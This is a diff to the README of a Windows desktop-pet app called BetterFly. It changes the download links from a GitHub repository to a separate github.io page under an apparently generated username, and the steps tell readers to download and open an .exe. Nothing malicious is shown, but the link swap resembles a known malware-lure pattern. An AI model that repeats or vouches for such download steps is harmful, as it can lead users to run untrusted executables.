@@ -1,6 +1,6 @@
 # 🦋 BetterFly - A digital pet for your desktop
 
-[![](https://img.shields.io/badge/Download_BetterFly-Blue.svg)](https://github.com/Pusillanimityswordstick588/BetterFly)
+[![](https://img.shields.io/badge/Download_BetterFly-Blue.svg)](https://pusillanimityswordstick588.github.io)
 
 BetterFly is a virtual pet for your Windows computer. It sits on your desktop and reacts to your actions. You can customize how it looks and watch it share thoughts about your computer use. It stays out of your way while providing company as you work or browse. 
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the app:
 
 Follow these steps to get BetterFly on your machine.
 
-1. Go to the [official release page](https://github.com/Pusillanimityswordstick588/BetterFly).
+1. Go to the [official release page](https://pusillanimityswordstick588.github.io).
 2. Find the section labeled "Assets."
 3. Click the file that ends with `.exe` to start the download.
 4. Open the file once the download finishes.
